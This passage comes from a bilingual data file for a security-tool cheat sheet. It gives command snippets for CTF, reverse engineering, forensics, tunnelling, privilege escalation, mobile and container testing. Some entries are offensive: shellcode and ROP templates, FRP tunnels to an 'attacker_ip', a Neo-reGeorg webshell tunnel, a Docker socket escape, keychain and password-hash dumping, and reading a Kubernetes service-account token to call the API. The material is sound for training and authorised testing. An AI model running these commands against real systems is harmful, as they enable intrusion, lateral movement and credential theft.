        command: 'prowler aws --compliance cis_1.5_aws',
        description: { zh: '按指定合规基线筛选检查项。', en: 'Filter checks by a specified compliance baseline.' },
        platform: 'all'
      },
      {
        name: { zh: '导出 HTML 报告', en: 'Export HTML report' },
        command: 'prowler aws -M html -o prowler-report',
        description: { zh: '导出更适合学习和归档查看的 HTML 报告。', en: 'Export an HTML report for study and archival review.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/prowler-cloud/prowler']
  },

  {
    id: 'pwntools',
    name: 'Pwntools',
    description: { zh: 'Python PWN 开发框架，用于二进制漏洞利用', en: 'Python CTF exploit development framework for binary exploitation' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    installation: 'pip install pwntools',
    commands: [
      { name: { zh: '连接远程', en: 'Connect to remote' }, command: "from pwn import *\nr = remote('target', 1337)\nr.sendline(b'payload')\nprint(r.recvline())", description: { zh: '连接远程目标端口', en: 'Connect to a remote target port' }, platform: 'all' },
      { name: { zh: '本地调试', en: 'Local debug' }, command: "from pwn import *\np = process('./binary')\ngdb.attach(p, gdbscript='b main')\np.interactive()", description: { zh: '附加 GDB 本地调试', en: 'Attach GDB for local debugging' }, platform: 'linux' },
      { name: { zh: '生成 Shellcode', en: 'Generate shellcode' }, command: "from pwn import *\ncontext.arch = 'amd64'\nshellcode = asm(shellcraft.sh())\nprint(shellcode.hex())", description: { zh: '生成目标架构 shellcode', en: 'Generate shellcode for target architecture' }, platform: 'all' },
      { name: { zh: '格式化字符串利用', en: 'Format string exploit' }, command: "from pwn import *\npayload = fmtstr_payload(6, {0x804a000: 0xdeadbeef})\np.sendline(payload)", description: { zh: '自动计算格式化字符串 payload', en: 'Auto-compute format string payload' }, platform: 'all' },
      { name: { zh: 'ROP 链构造', en: 'Build ROP chain' }, command: "from pwn import *\nelf = ELF('./binary')\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh'))])\nprint(rop.dump())", description: { zh: '自动构造 ROP 链', en: 'Auto-build ROP chain' }, platform: 'all' },
      { name: { zh: '栈溢出模板', en: 'Stack overflow template' }, command: "from pwn import *\np = process('./pwn')\noffset = cyclic_find(0x61616166)\np.sendline(b'A' * offset + p64(0xdeadbeef))", description: { zh: '使用 cyclic 定位偏移量', en: 'Use cyclic to find overflow offset' }, platform: 'linux' },
      { name: { zh: '堆利用示例', en: 'Heap exploit template' }, command: "from pwn import *\np = process('./heap_pwn')\nmalloc = lambda size: p.sendline(b'1\\n' + str(size).encode())\nfree = lambda idx: p.sendline(b'2\\n' + str(idx).encode())", description: { zh: '堆菜单题常用操作模板', en: 'Common heap menu challenge template' }, platform: 'linux' }
    ],
    references: ['https://docs.pwntools.com/en/stable/']
  },
  {
    id: 'gdb-enhanced',
    name: { zh: 'GDB 增强插件 (pwndbg/GEF/peda)', en: 'GDB Enhanced (pwndbg/GEF/peda)' },
    description: { zh: 'GDB 增强插件集合，用于二进制调试和漏洞分析', en: 'GDB enhancement plugins for binary debugging and vulnerability analysis' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    installation: 'git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh',
    commands: [
      { name: { zh: '启动调试', en: 'Start debugging' }, command: 'gdb -q ./binary\n# 或带参数\ngdb -q --args ./binary arg1 arg2', description: { zh: '以安静模式启动 GDB', en: 'Start GDB in quiet mode' }, platform: 'linux' },
      { name: { zh: '断点与运行', en: 'Breakpoint and run' }, command: 'b main\nb *0x401234\nr\nc', description: { zh: '设置断点并运行', en: 'Set breakpoints and run' }, platform: 'linux' },
      { name: { zh: '查看寄存器和栈', en: 'Inspect registers and stack' }, command: 'info registers\nx/20gx $rsp\ntelescope $rsp 20', description: { zh: '查看寄存器和栈内存', en: 'Inspect registers and stack memory' }, platform: 'linux' },
      { name: { zh: '堆状态检查', en: 'Heap inspection' }, command: 'heap\nbins\nvis_heap_chunks\nchunks', description: { zh: '检查堆布局和 bin 状态', en: 'Inspect heap layout and bin state' }, platform: 'linux' },
      { name: { zh: '反汇编', en: 'Disassemble' }, command: 'disass main\npdisass 0x401234\npd $rip 20', description: { zh: '反汇编指定函数或地址', en: 'Disassemble a function or address' }, platform: 'linux' },
      { name: { zh: '查找 ROP gadget', en: 'Find ROP gadgets' }, command: 'ropper -f ./binary --search "pop rdi; ret"\nROPgadget --binary ./binary --rop', description: { zh: '搜索 ROP gadget', en: 'Search for ROP gadgets' }, platform: 'linux' },
      { name: { zh: '格式化字符串参数', en: 'Format string offset' }, command: 'fmtarg 6\n# 找到格式化字符串偏移\n# 输入 %p %p %p 确认偏移', description: { zh: '定位格式化字符串参数偏移', en: 'Find format string parameter offset' }, platform: 'linux' },
      { name: { zh: '搜索内存', en: 'Search memory' }, command: "search -t bytes '/bin/sh'\nsearch -t string 'password'\nfind 0x400000, 0x401000, '/bin/sh'", description: { zh: '在内存中搜索字节序列', en: 'Search for byte sequences in memory' }, platform: 'linux' }
    ],
    references: ['https://github.com/pwndbg/pwndbg', 'https://github.com/hugsy/gef']
  },
  {
    id: 'ghidra',
    name: 'Ghidra',
    description: { zh: 'NSA 开源逆向工程框架，支持多架构反编译', en: 'NSA open-source reverse engineering framework with multi-architecture decompilation' },
    category: { zh: '逆向工程', en: 'Reverse Engineering' },
    installation: { zh: '下载: https://ghidra-sre.org/', en: 'Download from: https://ghidra-sre.org/' },
    commands: [
      { name: { zh: '启动 GUI', en: 'Launch GUI' }, command: './ghidraRun', description: { zh: '启动 Ghidra 图形界面', en: 'Start the Ghidra GUI' }, platform: 'all' },
      { name: { zh: '无头分析', en: 'Headless analysis' }, command: './analyzeHeadless /tmp/project ProjName -import binary -postScript PrintTree.java', description: { zh: '命令行无头模式分析二进制', en: 'Analyze a binary in headless command-line mode' }, platform: 'all' },
      { name: { zh: 'Python 脚本分析', en: 'Python script analysis' }, command: './analyzeHeadless /tmp/proj Test -import crackme -scriptPath . -postScript my_script.py', description: { zh: '执行自定义 Python 分析脚本', en: 'Run a custom Python analysis script' }, platform: 'all' },
      { name: { zh: '快捷键速查', en: 'Key shortcuts' }, command: 'G = 跳转地址  L = 重命名  ; = 添加注释  F = 函数分析\nCtrl+F = 搜索  Ctrl+Shift+E = 导出程序', description: { zh: 'Ghidra 常用快捷键', en: 'Common Ghidra keyboard shortcuts' }, platform: 'all' }
    ],
    references: ['https://ghidra-sre.org/', 'https://github.com/NationalSecurityAgency/ghidra']
  },
  {
    id: 'radare2',
    name: 'Radare2',
    description: { zh: '开源跨平台逆向工程框架，支持静态和动态分析', en: 'Open-source cross-platform reverse engineering framework for static and dynamic analysis' },
    category: { zh: '逆向工程', en: 'Reverse Engineering' },
    installation: 'git clone https://github.com/radareorg/radare2 && cd radare2 && sys/install.sh',
    commands: [
      { name: { zh: '分析并打开', en: 'Analyze and open' }, command: 'r2 -A ./binary\n# -A 自动分析，-d 调试模式', description: { zh: '打开文件并执行自动分析', en: 'Open file with automatic analysis' }, platform: 'all' },
      { name: { zh: '反汇编函数', en: 'Disassemble function' }, command: 'pdf @main\npdf @sym.check_password\nafl  # 列出所有函数', description: { zh: '反汇编指定函数', en: 'Disassemble a specific function' }, platform: 'all' },
      { name: { zh: '查找字符串', en: 'Find strings' }, command: 'iz\nizz\niz~password\niz~flag', description: { zh: '搜索二进制中的字符串', en: 'Search for strings in the binary' }, platform: 'all' },
      { name: { zh: '查找 ROP gadget', en: 'Find ROP gadgets' }, command: '/R pop rdi; ret\n/R/ pop rdi', description: { zh: '搜索 ROP gadget 地址', en: 'Search for ROP gadget addresses' }, platform: 'all' },
      { name: { zh: '修改二进制', en: 'Patch binary' }, command: 'r2 -w ./binary\ns 0x401234\nwa nop\n# 修改一个字节: wx 90', description: { zh: '直接修改二进制文件', en: 'Patch bytes in the binary' }, platform: 'all' },
      { name: { zh: '调试模式', en: 'Debug mode' }, command: 'r2 -d ./binary\ndb main\ndc\ndr  # 查看寄存器\nds  # 单步', description: { zh: '使用 r2 调试器', en: 'Use the r2 debugger' }, platform: 'linux' },
      { name: { zh: '可视化模式', en: 'Visual mode' }, command: 'V  # 进入可视化\nVV # 函数图形化\np  # 切换显示模式', description: { zh: '进入可视化反汇编模式', en: 'Enter visual disassembly mode' }, platform: 'all' }
    ],
    references: ['https://book.rada.re/']
  },


  {
    id: 'binwalk',
    name: 'Binwalk',
    description: { zh: '固件和二进制文件分析、提取工具，常用于 CTF 固件题', en: 'Firmware and binary analysis and extraction tool, widely used in CTF firmware challenges' },
    category: { zh: 'CTF/固件分析', en: 'CTF / Firmware Analysis' },
    installation: 'apt install binwalk / pip install binwalk',
    commands: [
      { name: { zh: '扫描文件签名', en: 'Scan file signatures' }, command: 'binwalk firmware.bin', description: { zh: '识别固件中嵌入的文件签名', en: 'Identify embedded file signatures in firmware' }, platform: 'all' },
      { name: { zh: '提取嵌入文件', en: 'Extract embedded files' }, command: 'binwalk -e firmware.bin', description: { zh: '自动提取识别到的文件', en: 'Auto-extract identified embedded files' }, platform: 'all' },
      { name: { zh: '深度递归提取', en: 'Recursive deep extract' }, command: 'binwalk -Me firmware.bin', description: { zh: '递归提取所有嵌套文件', en: 'Recursively extract all nested files' }, platform: 'all' },
      { name: { zh: '熵值分析', en: 'Entropy analysis' }, command: 'binwalk -E firmware.bin', description: { zh: '绘制熵值图，识别加密或压缩区段', en: 'Plot entropy to identify encrypted or compressed sections' }, platform: 'all' },
      { name: { zh: '文件系统挂载', en: 'Mount filesystem' }, command: 'binwalk -e firmware.bin\ncd _firmware.bin.extracted/squashfs-root\nls -la', description: { zh: '提取后进入文件系统', en: 'Navigate extracted filesystem' }, platform: 'linux' }
    ],
    references: ['https://github.com/ReFirmLabs/binwalk']
  },
  {
    id: 'angr',
    name: 'angr',
    description: { zh: 'Python 二进制分析框架，支持符号执行，常用于 CTF 自动解题', en: 'Python binary analysis framework with symbolic execution, commonly used for CTF auto-solving' },
    category: { zh: 'CTF/逆向', en: 'CTF / Reverse Engineering' },
    installation: 'pip install angr',
    commands: [
      { name: { zh: 'CTF 符号执行解题', en: 'CTF symbolic execution' }, command: "import angr\np = angr.Project('./crackme', auto_load_libs=False)\nsm = p.factory.simgr()\nsm.explore(find=lambda s: b'Correct' in s.posix.dumps(1))\nprint(sm.found[0].posix.dumps(0))", description: { zh: '自动探索找到成功路径', en: 'Auto-explore to find the success path' }, platform: 'all' },
      { name: { zh: '指定地址探索', en: 'Explore to address' }, command: "import angr\np = angr.Project('./binary')\nstate = p.factory.entry_state()\nsm = p.factory.simgr(state)\nsm.explore(find=0x401234, avoid=0x401260)\nprint(sm.found[0].posix.dumps(0))", description: { zh: '探索到指定地址并避开失败路径', en: 'Explore to target address, avoiding failure paths' }, platform: 'all' },
      { name: { zh: '约束求解', en: 'Constraint solving' }, command: "import angr, claripy\np = angr.Project('./binary')\nflag = claripy.BVS('flag', 8*32)\nstate = p.factory.entry_state(stdin=flag)\nsm = p.factory.simgr(state)\nsm.explore(find=0x401234)\nprint(sm.found[0].solver.eval(flag, cast_to=bytes))", description: { zh: '使用符号变量求解输入', en: 'Use symbolic variables to solve for input' }, platform: 'all' }
    ],
    references: ['https://docs.angr.io/']
  },
  {
    id: 'volatility3',
    name: 'Volatility 3',
    description: { zh: '内存取证框架，用于分析 Windows/Linux/macOS 内存镜像', en: 'Memory forensics framework for analyzing Windows/Linux/macOS memory images' },
    category: { zh: 'CTF/内存取证', en: 'CTF / Memory Forensics' },
    installation: 'pip install volatility3 / git clone https://github.com/volatilityfoundation/volatility3',
    commands: [
      { name: { zh: '进程列表', en: 'Process list' }, command: 'vol3 -f memory.raw windows.pslist.PsList\nvol3 -f memory.raw linux.pslist.PsList', description: { zh: '列出内存中的进程', en: 'List processes from memory dump' }, platform: 'all' },
      { name: { zh: '网络连接', en: 'Network connections' }, command: 'vol3 -f memory.raw windows.netstat.NetStat\nvol3 -f memory.raw windows.netscan.NetScan', description: { zh: '提取网络连接信息', en: 'Extract network connection info' }, platform: 'all' },
      { name: { zh: '提取文件', en: 'Dump files' }, command: 'vol3 -f memory.raw windows.dumpfiles.DumpFiles --pid 1234\nvol3 -f memory.raw windows.dumpfiles.DumpFiles --virtaddr 0x...', description: { zh: '从内存中提取文件', en: 'Dump files from memory' }, platform: 'all' },
      { name: { zh: '进程注入检测', en: 'Detect process injection' }, command: 'vol3 -f memory.raw windows.malfind.Malfind', description: { zh: '检测可疑的内存注入', en: 'Detect suspicious memory injection' }, platform: 'all' },
      { name: { zh: 'Hash 提取', en: 'Extract hashes' }, command: 'vol3 -f memory.raw windows.hashdump.Hashdump\nvol3 -f memory.raw windows.lsadump.Lsadump', description: { zh: '提取用户密码哈希', en: 'Extract user password hashes' }, platform: 'all' },
      { name: { zh: '命令历史', en: 'Command history' }, command: 'vol3 -f memory.raw windows.cmdline.CmdLine\nvol3 -f memory.raw windows.consoles.Consoles', description: { zh: '查看进程命令行历史', en: 'View process command line history' }, platform: 'all' },
      { name: { zh: '注册表', en: 'Registry' }, command: 'vol3 -f memory.raw windows.registry.printkey.PrintKey --key "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"', description: { zh: '读取注册表内容', en: 'Read registry contents' }, platform: 'all' }
    ],
    references: ['https://volatility3.readthedocs.io/']
  },
  {
    id: 'steganography-tools',
    name: { zh: '隐写术工具集', en: 'Steganography Toolkit' },
    description: { zh: 'CTF 隐写术常用工具命令集合', en: 'Common steganography tool commands for CTF challenges' },
    category: { zh: 'CTF/隐写', en: 'CTF / Steganography' },
    installation: 'apt install steghide zsteg exiftool foremost / pip install stegano',
    commands: [
      { name: { zh: 'steghide 提取', en: 'steghide extract' }, command: 'steghide extract -sf image.jpg -p "" -f\nsteghide info image.jpg', description: { zh: '从图片中提取隐写数据', en: 'Extract hidden data from an image' }, platform: 'linux' },
      { name: { zh: 'zsteg PNG 分析', en: 'zsteg PNG analysis' }, command: 'zsteg -a image.png\nzsteg -e "b1,r,lsb,xy" image.png', description: { zh: '分析 PNG 各通道 LSB', en: 'Analyze PNG channel LSB data' }, platform: 'all' },
      { name: { zh: 'exiftool 元数据', en: 'exiftool metadata' }, command: 'exiftool image.jpg\nexiftool -Comment image.jpg', description: { zh: '提取图片元数据中的隐藏信息', en: 'Extract hidden info from image metadata' }, platform: 'all' },
      { name: { zh: 'strings 过滤', en: 'Extract strings' }, command: "strings image.jpg | grep -E 'flag|CTF|\\{'\nstrings -n 6 file.bin | head -50", description: { zh: '从文件中提取可见字符串', en: 'Extract printable strings from file' }, platform: 'all' },
      { name: { zh: 'foremost 文件恢复', en: 'foremost file recovery' }, command: 'foremost -i image.jpg -o output/\nforemost -t png,jpg,gif -i disk.img -o out/', description: { zh: '从文件中恢复嵌入的其他文件', en: 'Recover embedded files from container file' }, platform: 'linux' },
      { name: { zh: 'LSB Python 分析', en: 'LSB Python analysis' }, command: "from PIL import Image\nimg = Image.open('img.png')\npixels = list(img.getdata())\nbits = [p[0] & 1 for p in pixels[:100]]\nprint(''.join(map(str, bits)))", description: { zh: 'Python 提取图片 LSB', en: 'Extract LSB from image using Python' }, platform: 'all' },
      { name: { zh: '音频隐写', en: 'Audio steganography' }, command: '# Audacity: 查看频谱图 (Spectrum Analyzer)\n# DeepSound: 提取音频隐写\nmp3stego-decode -f output.txt audio.mp3', description: { zh: '音频文件隐写分析', en: 'Analyze audio file for steganography' }, platform: 'all' }
    ],
    references: ['https://github.com/bannsec/stegoVeritas', 'https://0xrick.github.io/lists/stego/']
  },


  {
    id: 'frp-tunnel',
    name: 'FRP (Fast Reverse Proxy)',
    description: { zh: '高性能反向代理，用于内网穿透和端口映射', en: 'High-performance reverse proxy for intranet tunneling and port mapping' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    installation: { zh: '下载: https://github.com/fatedier/frp/releases', en: 'Download from: https://github.com/fatedier/frp/releases' },
    commands: [
      { name: { zh: '服务端配置', en: 'Server config (frps.toml)' }, command: '[common]\nbind_port = 7000\ntoken = your_secret_token', description: { zh: '基础服务端配置文件', en: 'Basic server configuration' }, platform: 'linux' },
      { name: { zh: '启动服务端', en: 'Start server' }, command: './frps -c frps.toml', description: { zh: '在公网服务器启动 frps', en: 'Start frps on public server' }, platform: 'linux' },
      { name: { zh: 'TCP 端口映射', en: 'TCP port mapping' }, command: '# frpc.toml\n[common]\nserver_addr = attacker_ip\nserver_port = 7000\ntoken = your_secret_token\n\n[ssh]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = 6000', description: { zh: '将内网 SSH 映射到公网', en: 'Map internal SSH to public server' }, platform: 'all' },
      { name: { zh: 'SOCKS5 代理', en: 'SOCKS5 proxy' }, command: '# frpc.toml\n[socks5]\ntype = tcp\nremote_port = 1080\nplugin = socks5\n\n# 启动客户端\n./frpc -c frpc.toml', description: { zh: '建立 SOCKS5 代理隧道', en: 'Establish SOCKS5 proxy tunnel' }, platform: 'all' },
      { name: { zh: '访问隧道', en: 'Use the tunnel' }, command: 'ssh -p 6000 user@attacker_ip\n# 或通过 SOCKS5\nproxychains4 nmap -sT -Pn 10.10.10.0/24', description: { zh: '通过映射的端口访问内网', en: 'Access internal network through mapped port' }, platform: 'all' }
    ],
    references: ['https://github.com/fatedier/frp']
  },
  {
    id: 'regeorg',
    name: 'Neo-reGeorg',
    description: { zh: '基于 HTTP/HTTPS 的隧道工具，适合 Webshell 环境内网穿透', en: 'HTTP/HTTPS-based tunnel tool for intranet access through webshell environments' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    installation: 'git clone https://github.com/L-codes/Neo-reGeorg',
    commands: [
      { name: { zh: '生成隧道脚本', en: 'Generate tunnel script' }, command: 'python3 neoreg.py generate -k mypassword -o tunnel.php\n# 支持 php/aspx/jsp/js/go 等格式', description: { zh: '生成加密的隧道 WebShell 文件', en: 'Generate encrypted tunnel webshell file' }, platform: 'all' },
      { name: { zh: '启动本地代理', en: 'Start local SOCKS proxy' }, command: 'python3 neoreg.py -k mypassword -u http://target.com/tunnel.php\n# 默认监听 127.0.0.1:1080', description: { zh: '通过上传的脚本建立 SOCKS5 代理', en: 'Establish SOCKS5 proxy through uploaded script' }, platform: 'all' },
      { name: { zh: '配合 ProxyChains', en: 'Use with ProxyChains' }, command: '# /etc/proxychains4.conf: socks5 127.0.0.1 1080\nproxychains4 nmap -sT -Pn -p 80,443,3389,22 10.10.10.0/24\nproxychains4 ssh user@10.10.10.5', description: { zh: '通过隧道扫描和连接内网', en: 'Scan and connect to internal network through tunnel' }, platform: 'linux' }
    ],
    references: ['https://github.com/L-codes/Neo-reGeorg']
  },
  {
    id: 'pspy',
    name: 'pspy',
    description: { zh: '无需 root 权限监控 Linux 进程和 cron 任务，常用于提权侦察', en: 'Monitor Linux processes and cron jobs without root, used for privilege escalation reconnaissance' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    installation: { zh: '下载: https://github.com/DominicBreuker/pspy/releases', en: 'Download from: https://github.com/DominicBreuker/pspy/releases' },
    commands: [
      { name: { zh: '监控所有进程', en: 'Monitor all processes' }, command: './pspy64\n# 32位系统用 pspy32', description: { zh: '实时监控进程创建事件', en: 'Monitor process creation events in real time' }, platform: 'linux' },
      { name: { zh: '详细模式', en: 'Verbose mode' }, command: './pspy64 -pf -i 100', description: { zh: '显示文件系统事件，100ms 间隔', en: 'Show filesystem events with 100ms interval' }, platform: 'linux' },
      { name: { zh: '过滤 cron', en: 'Filter cron jobs' }, command: './pspy64 | grep -iE "cron|sh |python|bash"', description: { zh: '过滤 cron 相关进程', en: 'Filter for cron-related processes' }, platform: 'linux' }
    ],
    references: ['https://github.com/DominicBreuker/pspy']
  },
  {
    id: 'linux-exploit-suggester',
    name: 'Linux Exploit Suggester 2',
    description: { zh: '基于内核版本推荐本地提权漏洞', en: 'Recommend local privilege escalation exploits based on kernel version' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    installation: 'git clone https://github.com/jondonas/linux-exploit-suggester-2',
    commands: [
      { name: { zh: '本地检测', en: 'Local scan' }, command: './linux-exploit-suggester-2.pl', description: { zh: '自动检测当前内核版本并推荐漏洞', en: 'Auto-detect kernel version and suggest exploits' }, platform: 'linux' },
      { name: { zh: '指定内核版本', en: 'Specify kernel version' }, command: './linux-exploit-suggester-2.pl -k 5.4.0', description: { zh: '指定内核版本查找漏洞', en: 'Search exploits for a specific kernel version' }, platform: 'linux' },
      { name: { zh: 'LES (另一工具)', en: 'LES (alternative)' }, command: 'bash les.sh\n# https://github.com/mzet-/linux-exploit-suggester', description: { zh: '另一个 Linux 提权建议脚本', en: 'Another Linux exploit suggester script' }, platform: 'linux' }
    ],
    references: ['https://github.com/jondonas/linux-exploit-suggester-2']
  },
  {
    id: 'macos-commands',
    name: { zh: 'macOS 系统命令', en: 'macOS System Commands' },
    description: { zh: 'macOS 日常运维和安全测试常用命令', en: 'Common macOS commands for administration and security testing' },
    category: { zh: '系统命令', en: 'System Commands' },
    installation: { zh: 'macOS 内置', en: 'Built-in on macOS' },
    commands: [
      { name: { zh: '系统信息', en: 'System info' }, command: 'sw_vers\nuname -a\nsystem_profiler SPSoftwareDataType', description: { zh: '查看 macOS 版本和硬件信息', en: 'Show macOS version and hardware info' }, platform: 'all' },
      { name: { zh: '网络配置', en: 'Network config' }, command: 'ifconfig\nnetstat -an | grep LISTEN\nlsof -i -P | grep LISTEN', description: { zh: '查看网络接口和监听端口', en: 'View network interfaces and listening ports' }, platform: 'all' },
      { name: { zh: '软件包管理', en: 'Package management' }, command: 'brew install tool\nbrew list\nbrew update && brew upgrade\nbrew search keyword', description: { zh: 'Homebrew 包管理操作', en: 'Homebrew package management' }, platform: 'all' },
      { name: { zh: 'SIP 状态', en: 'SIP status' }, command: 'csrutil status\n# 重启进恢复模式: csrutil disable', description: { zh: '查看系统完整性保护状态', en: 'Check System Integrity Protection status' }, platform: 'all' },
      { name: { zh: '启动项', en: 'Launch agents' }, command: 'launchctl list | grep -v apple\nls /Library/LaunchAgents/ ~/Library/LaunchAgents/', description: { zh: '查看自启动项', en: 'List launch agents and daemons' }, platform: 'all' },
      { name: { zh: '进程管理', en: 'Process management' }, command: 'ps aux\ntop\nkillall -9 process_name\nactivity monitor  # GUI', description: { zh: '进程查看和管理', en: 'View and manage processes' }, platform: 'all' },
      { name: { zh: 'DNS 刷新', en: 'Flush DNS' }, command: 'sudo dscacheutil -flushcache\nsudo killall -HUP mDNSResponder', description: { zh: '刷新 DNS 缓存', en: 'Flush DNS cache' }, platform: 'all' },
      { name: { zh: '密钥链访问', en: 'Keychain access' }, command: 'security list-keychains\nsecurity find-internet-password -s domain.com -w\nsecurity dump-keychain login.keychain-db', description: { zh: '访问和查询密钥链', en: 'Access and query keychain' }, platform: 'all' },
      { name: { zh: '防火墙状态', en: 'Firewall status' }, command: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\npfctl -s rules  # pf 防火墙规则', description: { zh: '查看防火墙状态', en: 'Check firewall status' }, platform: 'all' },
      { name: { zh: '文件隔离', en: 'File quarantine' }, command: 'xattr -l file\nxattr -d com.apple.quarantine file\nspctl -a file', description: { zh: '管理文件隔离属性', en: 'Manage file quarantine attributes' }, platform: 'all' }
    ],
    references: ['https://ss64.com/osx/']
  },
  {
    id: 'adb-commands',
    name: 'ADB (Android Debug Bridge)',
    description: { zh: 'Android 调试桥，用于移动安全测试和 Android 管理', en: 'Android Debug Bridge for mobile security testing and Android device management' },
    category: { zh: '移动安全', en: 'Mobile Security' },
    installation: 'apt install adb / brew install android-platform-tools',
    commands: [
      { name: { zh: '设备连接', en: 'Device connection' }, command: 'adb devices\nadb connect 192.168.1.100:5555\nadb kill-server && adb start-server', description: { zh: '连接和管理 Android 设备', en: 'Connect and manage Android devices' }, platform: 'all' },
      { name: { zh: 'Shell 访问', en: 'Shell access' }, command: 'adb shell\nadb shell id\nadb shell su -c whoami', description: { zh: '获取设备 Shell', en: 'Get device shell' }, platform: 'all' },
      { name: { zh: 'APK 操作', en: 'APK operations' }, command: 'adb install app.apk\nadb install -r -d app.apk  # 强制降级安装\nadb uninstall com.example.app\nadb shell pm list packages | grep target', description: { zh: 'APK 安装和卸载', en: 'Install and uninstall APKs' }, platform: 'all' },
      { name: { zh: '提取 APK', en: 'Extract APK' }, command: 'adb shell pm path com.target.app\nadb pull /data/app/com.target.app-1/base.apk', description: { zh: '从设备提取已安装的 APK', en: 'Pull installed APK from device' }, platform: 'all' },
      { name: { zh: '日志监控', en: 'Log monitoring' }, command: 'adb logcat\nadb logcat -v time | grep -iE "password|token|secret|key"\nadb logcat *:E  # 只看错误日志', description: { zh: '监控设备日志', en: 'Monitor device logs' }, platform: 'all' },
      { name: { zh: '端口转发', en: 'Port forwarding' }, command: 'adb forward tcp:8080 tcp:8080\nadb reverse tcp:8080 tcp:8080  # 反向转发', description: { zh: '设置端口转发', en: 'Set up port forwarding' }, platform: 'all' },
      { name: { zh: 'Frida 注入', en: 'Frida injection' }, command: 'frida -U -f com.target.app -l script.js --no-pause\nfrida -U com.target.app -l ssl-bypass.js\nfrida-ps -Ua  # 列出运行中的应用', description: { zh: 'Frida 动态插桩和 SSL 绑定绕过', en: 'Frida dynamic instrumentation and SSL pinning bypass' }, platform: 'all' },
      { name: { zh: '截图和录屏', en: 'Screenshot and recording' }, command: 'adb exec-out screencap -p > screen.png\nadb shell screenrecord /sdcard/record.mp4', description: { zh: '截图和屏幕录制', en: 'Take screenshot and screen recording' }, platform: 'all' },
      { name: { zh: '文件操作', en: 'File operations' }, command: 'adb push local.txt /sdcard/\nadb pull /sdcard/file.txt .\nadb shell ls /data/data/com.target.app/', description: { zh: '设备文件传输和浏览', en: 'Transfer and browse device files' }, platform: 'all' }
    ],
    references: ['https://developer.android.com/studio/command-line/adb']
  },


  {
    id: 'docker-security',
    name: { zh: 'Docker 安全命令', en: 'Docker Security Commands' },
    description: { zh: 'Docker 容器安全测试和逃逸检测命令', en: 'Docker container security testing and escape detection commands' },
    category: { zh: '容器安全', en: 'Container Security' },
    installation: 'apt install docker.io / brew install docker',
    commands: [
      { name: { zh: '逃逸条件检测', en: 'Escape condition check' }, command: 'cat /proc/1/cgroup\ncapsh --print\nls -la /dev\nenv | grep -i docker', description: { zh: '检测是否在容器内及逃逸条件', en: 'Detect if inside container and escape conditions' }, platform: 'linux' },
      { name: { zh: 'Docker Socket 逃逸', en: 'Docker socket escape' }, command: 'ls -la /var/run/docker.sock\ndocker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh', description: { zh: '通过挂载的 Docker socket 逃逸', en: 'Escape via mounted Docker socket' }, platform: 'linux' },
      { name: { zh: '环境变量泄露检测', en: 'Env var leak check' }, command: "env | grep -iE 'password|token|secret|key|api|aws|credential'", description: { zh: '检测容器环境变量中的敏感信息', en: 'Check for sensitive data in container env vars' }, platform: 'linux' },
      { name: { zh: '挂载点检查', en: 'Mount point check' }, command: "cat /proc/mounts\nmount | grep -v 'proc\\|sysfs\\|devpts\\|cgroup'", description: { zh: '查看敏感挂载点', en: 'Check for sensitive mount points' }, platform: 'linux' },
      { name: { zh: '特权容器检测', en: 'Privileged container check' }, command: 'cat /proc/self/status | grep CapEff\n# 0000003fffffffff = 全部capabilities(特权容器)', description: { zh: '检测是否为特权容器', en: 'Check if running as privileged container' }, platform: 'linux' },
      { name: { zh: '容器网络扫描', en: 'Container network scan' }, command: 'ip addr show\nfor i in $(seq 1 254); do (ping -c1 172.17.0.$i &>/dev/null && echo 172.17.0.$i) & done; wait', description: { zh: '扫描容器网段内的存活主机', en: 'Scan live hosts in container network segment' }, platform: 'linux' },
      { name: { zh: 'Trivy 镜像扫描', en: 'Trivy image scan' }, command: 'trivy image nginx:latest\ntrivy image --severity HIGH,CRITICAL myapp:latest', description: { zh: '扫描镜像中的已知漏洞', en: 'Scan image for known vulnerabilities' }, platform: 'all' },
      { name: { zh: '镜像历史分析', en: 'Image history analysis' }, command: 'docker history --no-trunc image_name\ndocker inspect image_name | jq .[].Config.Env', description: { zh: '分析镜像构建历史和环境变量', en: 'Analyze image build history and environment variables' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security']
  },
  {
    id: 'kubernetes-security',
    name: { zh: 'Kubernetes 安全命令', en: 'Kubernetes Security Commands' },
    description: { zh: 'Kubernetes 集群安全测试和权限提升命令', en: 'Kubernetes cluster security testing and privilege escalation commands' },
    category: { zh: '容器安全', en: 'Container Security' },
    installation: 'apt install kubectl / brew install kubectl',
    commands: [
      { name: { zh: '权限检查', en: 'Permission check' }, command: 'kubectl auth can-i --list\nkubectl auth can-i create pods --as=system:serviceaccount:default:default', description: { zh: '检查当前 ServiceAccount 权限', en: 'Check current ServiceAccount permissions' }, platform: 'all' },
      { name: { zh: 'Token 读取', en: 'Read SA token' }, command: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt', description: { zh: '读取 Pod 内 ServiceAccount token', en: 'Read ServiceAccount token from inside Pod' }, platform: 'linux' },
      { name: { zh: 'API 直接访问', en: 'Direct API access' }, command: 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -k https://kubernetes.default.svc/api/v1/namespaces -H "Authorization: Bearer $TOKEN"', description: { zh: '使用 token 直接调用 K8s API', en: 'Call K8s API directly using token' }, platform: 'linux' },
      { name: { zh: '枚举集群资源', en: 'Enumerate cluster resources' }, command: 'kubectl get all -A\nkubectl get secrets -A\nkubectl get configmaps -A', description: { zh: '枚举所有命名空间的资源', en: 'Enumerate resources across all namespaces' }, platform: 'all' },
